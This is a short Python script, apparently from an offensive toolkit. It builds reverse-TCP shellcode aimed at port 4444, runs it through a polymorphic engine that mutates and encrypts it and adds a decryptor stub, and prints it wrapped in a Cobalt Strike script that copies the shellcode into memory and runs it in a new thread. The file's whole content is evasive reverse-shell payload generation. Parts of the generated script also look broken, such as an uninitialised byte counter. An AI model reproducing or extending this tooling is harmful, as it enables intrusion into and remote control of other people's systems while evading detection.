from src.engine import PolymorphicEngine
from src.payload_generator import PayloadGenerator

def generate_cobalt_strike_script(shellcode):
	"""
	Format shellcode for Cobalt Strike execute-assembly
	"""
	hex_payload = ",".join([f"0x{b:02x}" for b in shellcode])
	return f"""
alias sshellcode {{
	local('$data $sc');
	$data = alloc($1);
	$sc = {hex_payload};
	
	# Copy payload to memory
	foreach $byte ($sc) {{
		putb($data, $bpos, $byte);
		$bpos += 1;
	}}
	
	# Execute
	createThread($data, 0);
}}
""" 

if __name__ == "__main__":
	# Generate sample payload
	pg = PayloadGenerator()
	sc = pg.generate_reverse_tcp("127.0.0.1", 4444)
	
	# Apply polymorphism
	pe = PolymorphicEngine()
	mutated = pe.mutate(sc)
	encrypted = pe.encrypt(mutated)
	final_payload = pe.generate_decryptor_stub() + encrypted
	
	print(generate_cobalt_strike_script(final_payload))